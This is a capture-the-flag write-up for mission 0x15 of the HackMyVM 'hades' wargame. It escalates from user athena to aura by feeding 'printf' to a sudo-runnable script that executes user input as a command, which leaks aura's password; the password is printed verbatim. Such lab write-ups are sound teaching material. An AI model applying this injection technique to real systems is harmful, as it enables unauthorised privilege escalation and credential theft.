# 0x15
This write-up explains the steps taken to complete mission 0x15 on hades@hackmyvm.eu, starting from user `athena` and escalating to `aura`.

## Mission
As usual, we read the objective first:
```bash
athena@hades:~$ cat mission.txt 
################
# MISSION 0x15 #
################

## EN ##
User aura lets us use her new script.
```
The mission for this level centered on an interactive script belonging to user `aura`.

## Method of Solving: Command Injection / Parameter Leak
In the home directory, we found a backup script named `auri_old.sh`.
```bash
athena@hades:~$ ls -la
total 36
drwxr-x--- 2 root   athena 4096 Apr  5  2024 .
drwxr-xr-x 1 root   root   4096 Apr  5  2024 ..
-rw-r--r-- 1 athena athena  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 athena athena 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 athena athena  807 Apr 23  2023 .profile
-rw-r----- 1 root   athena  166 Apr  5  2024 auri_old.sh
-rw-r----- 1 root   athena   22 Apr  5  2024 flagz.txt
-rw-r----- 1 root   athena  160 Apr  5  2024 mission.txt
```
### Code Analysis
The backup script `auri_old.sh` revealed the logic of how the interactive tool handles user input:
```bash
athena@hades:~$ cat auri_old.sh 

#!/bin/bash
echo "What?"
read hackme
#Secure the condition!
#if [[ $hackme =~ "????????" ]]; then
#exit
#fi
#Add newest Aura pass!
#$hackme AURANEWPASS 2>/dev/null
```
The script prompts for input (read hackme) and then attempt to execute that input as a command, passing a secret value (AURANEWPASS) as an argument to it.

### Command Injection
Upon checking the available `sudo` privileges, we found that we could execute a script in Aura's home directory with her privileges without a password.
```bash
athena@hades:~$ sudo -l
Matching Defaults entries for athena on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User athena may run the following commands on hades:
    (aura) NOPASSWD: /bin/bash -c /pwned/aura/auri.sh
```
We executed the live script using `sudo -u aura`. The script asked "What?", waiting for a command to run against the hidden password. The goal was to provide a command that would simply print its argument insteacd of trying to "execute" them. We used the `printf` command.
```bash
athena@hades:~$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
What?
printf
TiqpedAFjwmVyBlYpzRhathena@hades:~$ 
```
Using the retrieved password, we successfully established a SSH session as `aura`.
```bash
athena@hades:~$ ssh aura@localhost
...
aura@hades:~$ id ; hostname
uid=2007(aura) gid=2007(aura) groups=2007(aura)
hades
```
### Explanation
- **Logic Flaw**: The script uses a variable (`$hackme`) directly as a command. This is a form of Command Injection. By providing a command like `printf`, `echo`, or `cat`, you can force the script to reveal whatever it was supposed to keep secret.
- **Sudo Execution**: Because the script was run with `sudo -u aura`, the shell enviroment within the script had the authority to access Aura's secrets and process her specific credentials.

## Key command
`sudo -l`

`sudo -u aura /bin/bash -c /pwned/aura/auri.sh`

***You are welcome!***
